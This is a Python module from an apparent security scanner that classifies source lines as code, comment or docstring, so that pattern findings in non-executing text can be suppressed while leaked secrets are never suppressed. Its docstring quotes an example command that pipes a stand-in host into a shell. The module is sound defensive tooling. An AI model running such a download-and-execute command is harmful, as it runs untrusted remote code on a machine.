"""
Lexical context of a source line: is a match live code, or is it being TALKED ABOUT?

WHY THIS EXISTS
---------------
PRAETOR's dominant false-positive class is pattern-presence in text that never
executes: a `curl | sh` inside a code comment explaining the attack, a threat
described in a docstring, an example in prose. Measured on PRAETOR's own repo,
every one of 47 self-scan findings was of this kind (references/SELF-SCAN-BASELINE.json).

This module answers one narrow question -- what KIND of text is this line? --
and nothing else. It is pure: text in, label out, no file I/O and no policy.
The decision about which contexts justify suppression lives with the caller,
because that decision differs per engine and is the dangerous half.

🔴 THE DISTINCTION THAT MAKES THIS SAFE, AND IT IS NOT SYMMETRIC
----------------------------------------------------------------
A BEHAVIOURAL pattern in a comment is inert -- the comment cannot exec anything.
A SECRET in a comment is still a leaked secret. The credential is disclosed by
being written down, not by being executed:

    # password = "hunter2"        <- STILL A LEAK. Never suppress this.
    # curl evil.example | sh      <- inert. Safe to suppress.

So this module never suppresses anything itself, and callers must not apply it
to secret findings. `tests/test_lexctx_and_suppression_policy.py` holds that line
-- specifically `test_secret_in_a_comment_is_NEVER_suppressed`, which calls the
real `praetor._apply_lexical_context` rather than inspecting its config.

⚠️ DELIBERATELY NOT IMPLEMENTED: "the match is inside a collection literal."
That predicate is true of PRAETOR's own rule tables, and it is ALSO true of
`API_KEYS = ["sk-ant-…"]` in someone else's code. It is safe as a
PRAETOR-self-scan classification and unsafe as a general engine rule. It stays
in tools/classify_baseline.py and does not come here.
"""

from __future__ import annotations

import re

# The ONLY import, and it is deliberate: `split_lines` is the toolchain's single
# definition of a line. This module stays pure -- text in, label out, no I/O and
# no policy -- and importing a pure helper does not change that.
from core import split_lines

CODE = "code"
COMMENT = "comment"
DOCSTRING = "docstring"

_TRIPLES = ('"""', "'''")


def _strip_inline_strings(line: str) -> str:
    """
    Blank out single-line string literals so their contents cannot be mistaken
    for comment markers (and vice versa). Crude but predictable: it walks the
    line tracking one quote char at a time.
    """
    out, quote, i = [], None, 0
    while i < len(line):
        ch = line[i]
        if quote:
            out.append(" ")
            if ch == quote and line[i - 1 : i] != "\\":
                quote = None
        elif ch in ("'", '"'):
            quote = ch
            out.append(" ")
        else:
            out.append(ch)
        i += 1
    return "".join(out)


#: Comment introducers recognised by `comment_text`. 🔴 DELIBERATELY CONSERVATIVE.
#: This list decides where a SUPPRESSION marker is allowed to live, so the unsafe
#: direction here is recognising TOO MANY things as comments -- an over-generous
#: entry (`--`, `;`, `%`, `'`) would let an ordinary expression or a quoted value
#: introduce a "comment" and suppress a real finding.
#:
#: ⚠️ STATED IN FULL rather than implied: a marker written in SQL (`-- nosec`),
#: ini/asm (`; nosec`), MATLAB/TeX (`% nosec`) or VB (`' nosec`) is NOT honoured
#: and the finding is KEPT. That is the safe direction, and it is the whole
#: reason those are absent.
_HASH_COMMENT_EXTENSIONS = frozenset({
    ".py", ".pyi", ".pyw", ".sh", ".bash", ".zsh", ".fish", ".ps1",
    ".yml", ".yaml", ".toml", ".ini", ".cfg", ".conf", ".env",
    ".rb", ".pl", ".r",
})
_SLASH_COMMENT_EXTENSIONS = frozenset({
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".cs", ".go",
    ".java", ".js", ".jsx", ".ts", ".tsx", ".kt", ".kts", ".php",
    ".rs", ".swift",
})
_MARKUP_COMMENT_EXTENSIONS = frozenset({".html", ".htm", ".xml", ".svg", ".md", ".mdx"})
_PYTHON_EXTENSIONS = frozenset({".py", ".pyi", ".pyw"})


def _extension(file_identity: str) -> str:
    """Return a lower-case suffix without touching the scanned path."""
    name = str(file_identity or "").replace("\\", "/").rsplit("/", 1)[-1]
    return "." + name.rsplit(".", 1)[-1].lower() if "." in name else ""


def comment_introducers(file_identity: str) -> tuple:
    """Comment introducers this conservative lexer can prove for this file type.

    File identity is mandatory: deciding from the text alone made a Markdown
    heading and a YAML URL look like inert code comments. Unknown formats return
    no introducers, so ambiguous text is CODE and its finding is kept. Block
    comments are intentionally not recognised for C-like files because this
    line-oriented lexer cannot prove where a multi-line block ends.
    """
    ext = _extension(file_identity)
    if ext in _HASH_COMMENT_EXTENSIONS:
        return ("#",)
    if ext in _SLASH_COMMENT_EXTENSIONS:
        return ("//",)
    if ext in _MARKUP_COMMENT_EXTENSIONS:
        return ("<!--",)
    return ()


def comment_text(line: str, file_identity: str) -> str:
    """Return the COMMENT portion of a single line, or "" if it has none.

    String literals are blanked first, so a marker inside a string -- `x = "# nosec"`,
    or a JSON value, or a key named `"nosec_note"` -- is not mistaken for a comment.
    That distinction is the entire point: a file format with no comment syntax at
    all (JSON) must not be able to carry a suppression marker.
    """
    bare = _strip_inline_strings(line)
    first = None
    for intro in comment_introducers(file_identity):
        search_from = 0
        while True:
            idx = bare.find(intro, search_from)
            if idx == -1:
                break
            # In C-like source, the two slashes in a URL are not a comment
            # introducer.  Keep ordinary ``// note`` comments intact, while
            # recognising scheme-position URLs and protocol-relative hosts.
            if intro == "//":
                before = bare[:idx]
                after = bare[idx + 2:]
                scheme_url = before.endswith(":")
                protocol_relative = (
                    (not before.strip() or before.rstrip().endswith(("(", "=", ",", "[", "{")))
                    and bool(re.match(r"[A-Za-z0-9.-]+\.[A-Za-z]{2,}(?:/|\s|$)", after))
                )
                if scheme_url or protocol_relative:
                    search_from = idx + 2
                    continue
            if first is None or idx < first:
                first = idx
            break
    return "" if first is None else bare[first:]


def classify_lines(text: str, file_identity: str) -> list:
    """
    Return a per-line context label for `text` (1 label per line, index 0 = line 1).

    Handles the structures the file type can support safely: its proven
    single-line comment introducer, plus triple-quoted docstrings for Python
    files only. A line that needs a richer grammar is CODE and its finding is
    kept rather than suppressed.

    ⚠️ Approximate by construction, in the SAFE direction: anything it cannot
    confidently prove is inert is labelled CODE, so an unclear case is KEPT
    rather than suppressed. Nested/escaped exotica resolves to CODE. Line-by-line
    classification cannot model multi-line string constructs; heredocs and raw
    string literals are not handled and may still mislabel a line as a comment.
    """
    comment_prefixes = comment_introducers(file_identity)
    allow_docstrings = _extension(file_identity) in _PYTHON_EXTENSIONS
    slash_comments = "//" in comment_prefixes
    labels, in_triple, delim = [], False, None
    in_template = False

    # 🔴 split_lines, never str.splitlines. This list is indexed BY LINE NUMBER
    # by the caller, so a disagreement about what a line is relabels live code as
    # a comment or docstring -- and callers suppress on that label. See
    # core.split_lines for the concrete bypass.
    for raw in split_lines(text):
        if in_triple:
            labels.append(DOCSTRING)
            if delim in raw:
                in_triple, delim = False, None
            continue

        stripped = raw.strip()

        template_at_start = in_template

        opened = None
        token = None
        quote = None
        i = 0
        while i < len(raw):
            if quote is None:
                if slash_comments and raw[i] == "`":
                    in_template = not in_template
                    i += 1
                    continue
                if slash_comments and in_template:
                    if raw[i] == "\\":
                        i += 2
                    else:
                        i += 1
                    continue
                if allow_docstrings and (raw.startswith('"""', i) or raw.startswith("'''", i)):
                    token = ("triple", raw[i:i + 3], i)
                    break
                if any(raw.startswith(prefix, i) for prefix in comment_prefixes):
                    prefix = next(prefix for prefix in comment_prefixes if raw.startswith(prefix, i))
                    token = ("comment", prefix, i)
                    break
                if raw[i] in "'\"":
                    quote = raw[i]
                i += 1
            else:
                if raw[i] == "\\":
                    i += 2
                elif raw[i] == quote:
                    quote = None
                    i += 1
                else:
                    i += 1

        if token and token[0] == "triple":
            opened = token[1]

        if opened is not None:
            # A triple-quote that opens and closes on the same line is a
            # one-line docstring/string; it does not change block state.
            if raw.count(opened) >= 2:
                labels.append(DOCSTRING if stripped.startswith(opened) else CODE)
                continue
            labels.append(DOCSTRING if stripped.startswith(opened) else CODE)
            in_triple, delim = True, opened
            continue

        # A line is inert only when the comment introducer starts the line
        # (apart from whitespace). Trailing comments on live code stay CODE.
        if template_at_start:
            labels.append(CODE)
            continue
        if token and token[0] == "comment" and not raw[:token[2]].strip():
            labels.append(COMMENT)
            continue

        labels.append(CODE)

    return labels


def context_of(text: str, lineno: int, file_identity: str) -> str:
    """Context label for a single 1-based line. Out-of-range resolves to CODE."""
    labels = classify_lines(text, file_identity)
    if not (1 <= lineno <= len(labels)):
        return CODE
    return labels[lineno - 1]
